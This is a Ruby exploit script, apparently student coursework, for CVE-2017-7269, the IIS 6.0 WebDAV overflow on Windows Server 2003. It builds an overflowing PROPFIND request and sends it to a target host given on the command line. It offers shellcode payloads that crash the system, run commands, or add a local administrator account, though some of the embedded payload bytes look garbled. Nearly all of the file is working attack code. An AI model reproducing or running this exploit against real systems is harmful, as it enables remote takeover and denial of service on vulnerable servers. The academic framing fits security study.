##
# Robert Page (C3385644)
# Leeds Beckett University 
# Advanced Digital Security Fuzzing Project Part 2 
##

##
# This is a pure Ruby exploit for CVE-2017-7269
# Windows Server 2003 R2 IIS 6.0 WebDAV ScStoragePathFromUrl Overflow
##

require 'socket'

# Usage Banner 
def bann
	print "Usage: #{$0} <IP Address> <Port> [Payload] [Encoding]
	Current Payload Options: 
	 - calc - launches calc.exe
	 - BSOD - Blue Screen of Death
	 - msg  - Displays a message box
	 - cmd  - Exec command and close
	 - adm  - Add new Local Administrator Account
	"
end

# Popping calc.exe
def calc
	print "Selecting calc.exe payload"
	shellcode = "VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIA"
	shellcode << "J11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944"
	shellcode << "JB6X6WMV7O7Z8Z8Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U"
	shellcode << "7W5KJLOLMR5ZNL0ZMV5L5LMX1ZLP0V3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP"
	shellcode << "1QMTMK051P1Q0F6T00NZLL2K5U0O0X6P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X"
	shellcode << "5O5R2O02LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XKQ3O4S2ULR0DJN5Q4W1O0HMQLO"
	shellcode << "3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJZ2QMSNNKS1Q4L4O5Q"
	shellcode << "9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3ULY7Y0Y7X4Y"
	shellcode << "MW5MJULY7R1MKRKQ5W0X0N3U1KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKPA"
	return shellcode
end

# Blue Screen of Death! 
def bsod
	print "Selecting BSOD payload"
	shellcode = "\x6A\x30\x59\x64\x8B\x09\x85\xC9\x78\x0C\x8B\x49\x0C\x8B\x71\x1C"
	shellcode << "\xAD\x8B\x48\x08\xEB\x09\x8B\x49\x34\x8B\x49\x7C\x8B\x49\x3C"
	return shellcode
end

# Popup Message Box
def msg
	print "Selecting message payload" 
	shellcode = "\x33\xd2\x52\x52\x52\x52\xe8\xbe\xe9\x44\x7d"
	return shellcode
end

# Executes a command and closes
def cmd
	print "Selecting command payload"
	shellcode = "\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B\x52\x0C\x8B\x52\x14"
	shellcode << "\x8B\x72\x28\x33\xC9\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C"
	shellcode << "\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0\x81\xFF\x5B\xBC\x4A"
	shellcode << "\x6A\x8B\x5A\x10\x8B\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72"
  shellcode << "\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03\xF3\x33\xC9\x41\xAD"
  shellcode << "\x03\xC3\x81\x38\x47\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F"
  shellcode << "\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72\x65\x75\xE2\x49\x8B"
  shellcode << "\x72\x24\x03\xF3\x66\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14"
  shellcode << "\x8E\x03\xD3\x52\x68\x78\x65\x63\x01\xFE\x4C\x24\x03\x68\x57"
  shellcode << "\x69\x6E\x45\x54\x53\xFF\xD2\x68\x63\x6D\x64\x01\xFE\x4C\x24"
  shellcode << "\x03\x6A\x05\x33\xC9\x8D\x4C\x24\x04\x51\xFF\xD0\x68\x65\x73"
  shellcode << "\x73\x01\x8B\xDF\xFE\x4C\x24\x03\x68\x50\x72\x6F\x63\x68\x45"
  shellcode << "\x78\x69\x74\x54\xFF\x74\x24\x20\xFF\x54\x24\x20\x57\xFF\xD0"
  return shellcode
end

# Add a new Local Admin account. 
def adm 
	print "Selecting Local Admin payload"
	shellcode = "\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B\x52\x0C\x8B\x52\x14\x8B"
	shellcode << "\x72\x28\x33\xC9\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C\x02\x2C"
	shellcode << "\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A"
	shellcode << "\x10\x8B\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72\x34\x8B\x52\x78"
	shellcode << "\x03\xD3\x8B\x72\x20\x03\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47"
	shellcode << "\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F\x63\x41\x75\xEB\x81\x78"
	shellcode << "\x08\x64\x64\x72\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66\x8B\x0C"
	shellcode << "\x4E\x8B\x72\x1C\x03\xF3\x8B\x14\x8E\x03\xD3\x52\x68\x78\x65\x63"
	shellcode << "\x01\xFE\x4C\x24\x03\x68\x57\x69\x6E\x45\x54\x53\xFF\xD2\x6A\x05"
	shellcode << "\xEB\x23\xFF\xD0\x68\x65\x73\x73\x01\x8B\xDF\xFE\x4C\x24\x03\x68"
	shellcode << "\x50\x72\x6F\x63\x68\x45\x78\x69\x74\x54\xFF\x74\x24\x1C\xFF\x54"
	shellcode << "\x24\x1C\x57\xFF\xD0\xE8\xD8\xFF\xFF\xFF\x63\x6D\x64\x2E\x65\x78"
	shellcode << "\x65\x20\x2F\x63\x20\x6E\x65\x74\x20\x75\x73\x65\x72\x20\x52\x75"
	shellcode << "\x62\x62\x65\x72\x44\x75\x63\x6B\x20\x6D\x75\x64\x62\x61\x74\x68"
	shellcode << "\x20\x2F\x61\x64\x64\x20\x26\x26\x20\x6E\x65\x74\x20\x6C\x6F\x63"
	shellcode << "\x26\x26\x20\x6E\x65\x74\x20\x6C\x6F\x63\x61\x6C\x67\x72\x6F\x75"
	shellcode << "\x70\x20\x61\x64\x6D\x74\x6F\x72\x73\x20\x52\x75\x62\x62\x65\x72"
	shellcode << "\x44\x75\x63\x6B\x20\x2F\x61\x64\x64\x00"
	return shellcode
end

def ipv4( ip )
	if /\A(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})\Z/ =~ ip
		return true
	end
	return false
end

# Takes IP Addr and Port No from Argv 
def exploit( ip, port, payl, enc )
	shell = ""
	# Building the payload
	pay = "PROPFIND / HTTP/1.1\r\nHost: #{ip}\r\nContent-Length: 0\r\n"
	pay << "If: <http://localhost/aaaaaaa"
	pay << "\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d"
	pay << "\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd\xb0\xe7\x95\x93\xe7\xa9\x8f\xe4\xa1\xa8"
	pay << "\xe5\x99\xa3\xe6\xb5\x94\xe6\xa1\x85\xe3\xa5\x93\xe5\x81\xac\xe5\x95\xa7\xe6"
	pay << "\x9d\xa3\xe3\x8d\xa4\xe4\x98\xb0\xe7\xa1\x85\xe6\xa5\x92\xe5\x90\xb1\xe4\xb1"
	pay << "\x98\xe6\xa9\x91\xe7\x89\x81\xe4\x88\xb1\xe7\x80\xb5\xe5\xa1\x90\xe3\x99\xa4"
	pay << "\xe6\xb1\x87\xe3\x94\xb9\xe5\x91\xaa\xe5\x80\xb4\xe5\x91\x83\xe7\x9d\x92\xe5"
	pay << "\x81\xa1\xe3\x88\xb2\xe6\xb5\x8b\xe6\xb0\xb4\xe3\x89\x87\xe6\x89\x81\xe3\x9d"
	pay << "\x8d\xe5\x85\xa1\xe5\xa1\xa2\xe4\x9d\xb3\xe5\x89\x90\xe3\x99\xb0\xe7\x95\x84"
	pay << "\xe6\xa1\xaa\xe3\x8d\xb4\xe4\xb9\x8a\xe7\xa1\xab\xe4\xa5\xb6\xe4\xb9\xb3\xe4"
	pay << "\xb1\xaa\xe5\x9d\xba\xe6\xbd\xb1\xe5\xa1\x8a\xe3\x88\xb0\xe3\x9d\xae\xe4\xad"
	pay << "\x89\xe5\x89\x8d\xe4\xa1\xa3\xe6\xbd\x8c\xe7\x95\x96\xe7\x95\xb5\xe6\x99\xaf"
	pay << "\xe7\x99\xa8\xe4\x91\x8d\xe5\x81\xb0\xe7\xa8\xb6\xe6\x89\x8b\xe6\x95\x97\xe7"
	pay << "\x95\x90\xe6\xa9\xb2\xe7\xa9\xab\xe7\x9d\xa2\xe7\x99\x98\xe6\x89\x88\xe6\x94"
	pay << "\xb1\xe3\x81\x94\xe6\xb1\xb9\xe5\x81\x8a\xe5\x91\xa2\xe5\x80\xb3\xe3\x95\xb7"
	pay << "\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4"
	pay << "\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89"
	pay << "\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0"
	pay << "\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a"
	pay << "\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1"
	pay << "\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91"
	pay << "\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92"
	pay << "\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7"
	pay << "\xa5\x81\xe7\xa9\x90\xe4\xa9\xac"
	pay << ">"
	pay << "(Not <locktoken:write1>) <http://localhost/bbbbbbb"
	pay << "\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1"
	pay << "\x85\xe3\x99\x86\xe6\x9d\xb5\xe4\x90\xb3\xe3\xa1\xb1\xe5\x9d\xa5\xe5\xa9\xa2"
	pay << "\xe5\x90\xb5\xe5\x99\xa1\xe6\xa5\x92\xe6\xa9\x93\xe5\x85\x97\xe3\xa1\x8e\xe5"
	pay << "\xa5\x88\xe6\x8d\x95\xe4\xa5\xb1\xe4\x8d\xa4\xe6\x91\xb2\xe3\x91\xa8\xe4\x9d"
	pay << "\x98\xe7\x85\xb9\xe3\x8d\xab\xe6\xad\x95\xe6\xb5\x88\xe5\x81\x8f\xe7\xa9\x86"
	pay << "\xe3\x91\xb1\xe6\xbd\x94\xe7\x91\x83\xe5\xa5\x96\xe6\xbd\xaf\xe7\x8d\x81\xe3"
	pay << "\x91\x97\xe6\x85\xa8\xe7\xa9\xb2\xe3\x9d\x85\xe4\xb5\x89\xe5\x9d\x8e\xe5\x91"
	pay << "\x88\xe4\xb0\xb8\xe3\x99\xba\xe3\x95\xb2\xe6\x89\xa6\xe6\xb9\x83\xe4\xa1\xad"
	pay << "\xe3\x95\x88\xe6\x85\xb7\xe4\xb5\x9a\xe6\x85\xb4\xe4\x84\xb3\xe4\x8d\xa5\xe5"
	pay << "\x89\xb2\xe6\xb5\xa9\xe3\x99\xb1\xe4\xb9\xa4\xe6\xb8\xb9\xe6\x8d\x93\xe6\xad"
	pay << "\xa4\xe5\x85\x86\xe4\xbc\xb0\xe7\xa1\xaf\xe7\x89\x93\xe6\x9d\x90\xe4\x95\x93"
	pay << "\xe7\xa9\xa3\xe7\x84\xb9\xe4\xbd\x93\xe4\x91\x96\xe6\xbc\xb6\xe7\x8d\xb9\xe6"
	pay << "\xa1\xb7\xe7\xa9\x96\xe6\x85\x8a\xe3\xa5\x85\xe3\x98\xb9\xe6\xb0\xb9\xe4\x94"
	pay << "\xb1\xe3\x91\xb2\xe5\x8d\xa5\xe5\xa1\x8a\xe4\x91\x8e\xe7\xa9\x84\xe6\xb0\xb5"
	pay << "\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3"
	pay << "\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91"
	pay << "\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f"
	pay << "\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4"
	pay << "\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1"
	pay << "\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87"
	pay << "\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2"
	pay << "\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf"
	pay << "\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91"
	pay << "\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80"
	pay << "\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7"
	pay << "\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c"
	pay << "\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86"
	pay << "\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4"
	pay << "\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81"
	pay << ">\r\n\r\n"
	case payl
		when 'calc'
			shell = calc
		when 'bsod'
			shell = bsod
		when 'msg'
			shell = msg
		when 'cmd'
			shell = cmd
		when 'adm'
			shell = adm 
	end

	if enc
		print "Setting encoding to #{enc}."
		encoding = enc.to_s
		shell.force_encoding(Encoding::encoding)
	else
		print "Defaulting to UTF-8 encoding."
		shell.force_encoding(Encoding::UTF_8)
	end

	pay << shell # Add shellcode to end of payload 
	print "Sending payload to #{ip}:#{port}\r\n"
	print "Payload\r\n#{pay}"
	if ipv4( ip )
		s = Socket.new Socket::AF_INET, Socket::SOCK_STREAM
		s = TCPSocket.open( ip, port ) # Opens connection with host, port
	else
		ip.chomp
		port.chomp
		s = Socket.new Socket::AF_INET6, Socket::SOCK_STREAM
		s = TCPSocket.new ip, port
	end
	s.print(pay)
	r = s.read
	h,b = r.split("\r\n\r\n", 2) # Use these if you expect to see a response. 
	print "\r\nResponse: \r\n"
	print h
	puts
	print b
	puts
	print "End."
	s.close
	exit
end

# Checks if IP Addr and Port have been supplied
if ARGV.empty?
	bann # Print Banner
	exit 
else # Socket will error if incorrect IP/Port so no need for further checks
	exploit( ARGV[0], ARGV[1], ARGV[2], ARGV[3] )
end